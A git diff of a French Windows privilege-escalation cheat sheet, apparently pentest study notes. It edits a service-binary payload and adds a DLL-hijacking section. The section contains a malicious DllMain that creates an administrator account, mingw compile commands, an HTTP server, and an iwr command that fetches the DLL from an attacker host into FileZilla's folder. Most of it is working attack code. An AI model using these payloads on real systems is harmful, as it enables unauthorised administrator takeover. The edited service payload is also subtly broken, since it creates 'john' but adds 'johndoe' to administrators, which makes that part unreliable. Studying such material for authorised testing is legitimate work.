@@ -21,26 +21,25 @@ whoami /groups
 ```
 
 **Utilisateurs locaux**
-```powershell
-Get-LocalUser
-```
 
 ```cmd
 net user
 net user <username>
 ```
 
-**Groupes locaux**
 ```powershell
-Get-LocalGroup
+Get-LocalUser
 ```
+
+**Groupes locaux**
 
 ```cmd
 net localgroup
+net localgroup <groupname>
 ```
 
-**Membres d'un groupe**
 ```powershell
+Get-LocalGroup
 Get-LocalGroupMember <groupname>
 ```
 
@@ -272,8 +271,8 @@ icacls "C:\xampp\mysql\bin\mysqld.exe"
 ```c
 #include <stdlib.h>
 int main() {
-  system("net user dave2 password123! /add");
-  system("net localgroup administrators dave2 /add");
+  system("net user john Password123! /add");
+  system("net localgroup administrators johndoe /add");
   return 0;
 }
 ```
@@ -308,8 +307,8 @@ shutdown /r /t 0
 
 **Vérifier que l'exploitation a fonctionné**
 
-```powershell
-Get-LocalGroupMember administrators
+```cmd
+net localgroup administrators
 ```
 
 **PowerUp - détecter les binaires de service modifiables**
@@ -327,3 +326,74 @@ Get-ModifiableServiceFile
 ```
 
 Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'exploitation manuellement.
+
+### DLL Hijacking
+
+**Installer Process Monitor (nécessite admin)**
+
+```cmd
+winget install Microsoft.Sysinternals
+```
+
+Ou télécharger depuis : https://learn.microsoft.com/fr-fr/sysinternals/downloads/sysinternals-suite
+
+**Détecter les DLLs hijackables sans admin avec PowerUp**
+
+Ne détecte que les DLLs déjà chargées, pas les `NAME NOT FOUND`. Les erreurs de process introuvables sont normales.
+
+```powershell
+. .\PowerUp.ps1
+Find-ProcessDLLHijack -ErrorAction SilentlyContinue
+```
+
+**Identifier les DLLs manquantes avec Process Monitor**
+
+Nécessite admin. Lancer Procmon, filtrer sur `Process Name is <process>`, puis `Operation is CreateFile` + `Result is NAME NOT FOUND`. Les entrées indiquent une DLL manquante — vérifier si le répertoire concerné est accessible en écriture. Si pas admin sur la cible, reproduire en local sur sa propre machine.
+
+**Vérifier qu'on peut écrire dans le répertoire de l'application**
+
+```powershell
+echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
+```
+
+**Créer la DLL malveillante**
+
+```cpp
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            int i;
+            i = system("net user john Password123! /add");
+            i = system("net localgroup administrators john /add");
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+```
+
+```bash
+# Compiler sur Kali
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+python3 -m http.server 80
+```
+
+**Placer la DLL dans le répertoire de l'application et attendre l'exécution**
+
+La DLL sera chargée avec les privileges de l'utilisateur qui lance l'application — attendre qu'un admin le fasse.
+
+```powershell
+iwr -uri http://<ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+```
+
+**Vérifier que l'exploitation a fonctionné**
+
+```cmd
+net localgroup administrators
+```
